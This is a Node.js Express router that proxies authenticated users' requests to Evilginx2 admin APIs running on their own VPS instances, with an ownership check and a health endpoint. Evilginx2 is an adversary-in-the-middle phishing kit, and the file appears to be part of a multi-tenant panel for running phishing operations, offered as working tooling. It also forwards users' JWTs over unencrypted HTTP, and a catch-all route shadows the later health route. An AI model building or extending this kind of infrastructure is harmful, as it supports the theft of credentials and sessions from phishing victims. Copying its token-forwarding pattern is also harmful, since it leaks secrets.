// =====================================================
// Evilginx2 API Proxy
// =====================================================
// Proxies requests to user's Evilginx2 instances with authentication

const express = require('express');
const router = express.Router();
const { authenticate } = require('../middleware/auth');
const axios = require('axios');
const pool = require('../db');

// =====================================================
// Middleware: Verify VPS Ownership or Admin
// =====================================================

const verifyVPSAccess = async (req, res, next) => {
    try {
        const { vpsId } = req.params;
        const userId = req.user.id;
        const isAdmin = req.user.metadata?.role === 'admin';
        
        // Get VPS instance
        const result = await pool.query(
            'SELECT * FROM vps_instances WHERE id = $1',
            [vpsId]
        );
        
        if (result.rows.length === 0) {
            return res.status(404).json({ success: false, message: 'VPS not found' });
        }
        
        const vps = result.rows[0];
        
        // Check access: user owns it OR user is admin
        if (vps.user_id !== userId && !isAdmin) {
            return res.status(403).json({ 
                success: false, 
                message: 'Access denied: You do not own this VPS instance' 
            });
        }
        
        req.vps = vps;
        next();
        
    } catch (error) {
        console.error('VPS access check error:', error);
        res.status(500).json({ success: false, message: 'Access verification failed' });
    }
};

// =====================================================
// Proxy ALL requests to Evilginx2 Admin API
// =====================================================

router.all('/:vpsId/*', authenticate, verifyVPSAccess, async (req, res) => {
    try {
        const { vpsId } = req.params;
        const path = req.params[0]; // Everything after /:vpsId/
        
        // Construct URL to user's Evilginx2 instance
        // Evilginx2 admin API runs on port 5555 by default
        const evilginxURL = `http://${req.vps.server_ip}:5555/api/${path}`;
        
        // Forward request with user's JWT token
        const response = await axios({
            method: req.method,
            url: evilginxURL,
            headers: {
                'Authorization': req.headers.authorization, // Pass JWT to Evilginx2
                'Content-Type': 'application/json',
                'X-Forwarded-For': req.ip
            },
            data: req.body,
            params: req.query,
            timeout: 30000,
            validateStatus: () => true // Don't throw on any status
        });
        
        // Forward response from Evilginx2
        res.status(response.status).json(response.data);
        
    } catch (error) {
        console.error('Evilginx proxy error:', error.message);
        
        if (error.code === 'ECONNREFUSED') {
            return res.status(503).json({
                success: false,
                message: 'Cannot connect to Evilginx2 instance. Is it running?'
            });
        }
        
        if (error.code === 'ETIMEDOUT') {
            return res.status(504).json({
                success: false,
                message: 'Connection to Evilginx2 instance timed out'
            });
        }
        
        res.status(500).json({
            success: false,
            message: error.message || 'Failed to communicate with Evilginx2 instance'
        });
    }
});

// =====================================================
// GET /:vpsId/health - Check if Evilginx2 instance is reachable
// =====================================================

router.get('/:vpsId/health', authenticate, verifyVPSAccess, async (req, res) => {
    try {
        const evilginxURL = `http://${req.vps.server_ip}:5555/api/stats`;
        
        const response = await axios.get(evilginxURL, {
            headers: {
                'Authorization': req.headers.authorization
            },
            timeout: 5000
        });
        
        res.json({
            success: true,
            data: {
                reachable: true,
                status: 'online',
                vps_id: req.vps.id,
                vps_name: req.vps.name
            }
        });
        
    } catch (error) {
        res.json({
            success: false,
            data: {
                reachable: false,
                status: 'offline',
                error: error.message
            }
        });
    }
});

module.exports = router;
